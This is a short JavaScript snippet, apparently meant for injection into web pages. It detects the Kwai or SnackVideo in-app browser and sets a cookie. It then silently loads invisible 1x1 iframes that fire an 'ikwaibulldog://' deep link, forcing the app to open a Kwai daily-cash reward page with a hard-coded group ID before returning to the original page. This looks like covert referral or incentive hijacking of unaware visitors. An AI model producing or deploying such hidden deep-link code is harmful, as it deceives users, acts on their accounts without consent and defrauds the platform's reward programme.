// UT12 //
function setCookie(name, value, minutes) {
  var expires = "";
  if (minutes) {
    var date = new Date();
    date.setTime(date.getTime() + (minutes * 60 * 1000));
    expires = "; expires=" + date.toUTCString();
  }
  document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

function getCookie(name) {
  var nameEQ = name + "=";
  var ca = document.cookie.split(';');
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

function isKwaiOrSnackVideoApp() {
  var ua = navigator.userAgent.toLowerCase();
  return ua.indexOf('kwai') > -1 || ua.indexOf('snackvideo') > -1;
}

var cookieName = 'KwaiCookie';
var cookieValue = getCookie(cookieName);
if (!cookieValue && isKwaiOrSnackVideoApp()) {
  setCookie(cookieName, 'true', 15);
  setTimeout(function() {
    var mainUrl = window.location.href;
    var iframe1 = document.createElement('iframe');
    iframe1.src = 'ikwaibulldog://webview?url=https%3A%2F%2Fincentive.kwai.com%2Fdaily-cash%2Freward%3FgroupId%3DsS67buRBNnmA-1JPBs-X1mwaXfn5r8plSEJCbQeDODCN6KMMVUZeYczju98lcuuv%26webview%3Dyoda%26showLoading%3Dtrue%26needLogin%3Dtrue%26need_login%3Dtrue%26source%3Dout%26share_channel%3DCOPY_LINK%26hyId%3Dincentive_main%26countryInfo%3DIDN';
    iframe1.width = '1';
    iframe1.height = '1';
    document.body.appendChild(iframe1);
    setTimeout(function() {
      var iframe2 = document.createElement('iframe');
      iframe2.src = 'ikwaibulldog://webview?url='+mainUrl;
      iframe2.width = '1';
      iframe2.height = '1';
      document.body.appendChild(iframe2);
    }, 50);
  }, 1);
}
